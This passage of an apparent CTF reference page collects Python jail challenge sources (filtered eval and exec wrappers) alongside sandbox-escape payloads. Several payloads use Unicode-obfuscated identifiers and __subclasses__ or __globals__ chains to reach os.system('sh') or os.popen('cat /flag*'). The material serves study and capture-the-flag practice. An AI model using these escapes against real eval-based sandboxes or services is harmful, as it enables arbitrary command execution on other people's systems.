<span class="token keyword">def</span> <span class="token function">_verify_source_safety</span><span class="token punctuation">(</span>__source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Direct execution of CodeType is forbidden!"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        __source <span class="token operator">=</span> __source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> _contains_protected_access<span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>
            <span class="token string">"Execution of code containing references to private or dunder methods, "</span>
            <span class="token string">"disallowed builtins, or any imports, is forbidden!"</span>
        <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_exec</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span></code>`,ml,an,No,Po,Li,bl,pn,d2=`<code class="language-py"><span class="token comment"># Using "with"-statement context managers to expose/retrieve Exception classes</span>
<span class="token comment"># https://rszalski.github.io/magicmethods/#context</span>
ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
obj <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
cus <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"\\137\\137exit\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>e<span class="token punctuation">,</span>v<span class="token punctuation">,</span>t<span class="token punctuation">:</span> <span class="token punctuation">[</span>ss<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"\\137\\137enter\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token boolean">None</span>
<span class="token keyword">with</span> cus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj<span class="token punctuation">.</span>lol
<span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
ex <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token string">"&#123;0.\\137\\137globals\\137\\137[\\137\\137builtins\\137\\137][\\137\\137import\\137\\137].lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token string">"&#123;0.popen.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"cat /flag*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#EOF</span></code>`,yl,tn,Up,Ti,gl,on,Ho,Uo,Ai,wl,en,f2=`<code class="language-py"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># no letters</span>
    alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
    <span class="token comment"># no numbers</span>
    numbers <span class="token operator">=</span> <span class="token string">"0123456789"</span>
    <span class="token comment"># no underscores</span>
    underscore <span class="token operator">=</span> <span class="token string">"__"</span>

    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> alphabet<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>c <span class="token keyword">in</span> numbers<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>underscore <span class="token keyword">in</span> code<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        g <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span>
        l <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> g<span class="token punctuation">,</span> l <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># good luck!</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lol no"</span><span class="token punctuation">)</span>

code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span>
safe_eval<span class="token punctuation">(</span>code<span class="token punctuation">)</span></code>`,vl,cn,Mo,Bo,Oi,El,ln,m2=`<code class="language-py"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D633}\u{1D626}\u{1D628}\u{1D62A}\u{1D634}\u{1D635}\u{1D626}\u{1D633}<span class="token punctuation">.</span>_\uFF3F\u{1D623}\u{1D636}\u{1D62A}\u{1D62D}\u{1D635}\u{1D62A}\u{1D62F}\u{1D634}\uFF3F_<span class="token punctuation">.</span>\u{1D637}\u{1D622}\u{1D62D}\u{1D636}\u{1D626}\u{1D634}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># https://github.com/UofTCTF/uoftctf-2024-chals-public/blob/master/Jail/zero/solve/writeup.md</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F<span class="token punctuation">.</span>\uFF3F\u{1D623}\u{1D622}\u{1D634}\u{1D626}\u{1D634}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D628}\u{1D626}\u{1D635}_\u{1D625}\u{1D622}\u{1D635}\u{1D622}<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,hl,un,Mp,Fi,xl,kn,So,qo,Ri,Cl,rn,b2=`<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You get one chance to awaken from the ice prison."</span><span class="token punctuation">)</span>
code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span> <span class="token comment"># not the flag</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist <span class="token keyword">for</span> x <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40000</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Denied!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code>`,Ll,_n,zo,Wo,Di,Tl,dn,y2=`<code class="language-py">m <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'&#123;a.__init__&#125;'][0].__init__.__builtins__['__import__']('os').system('sh')"""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
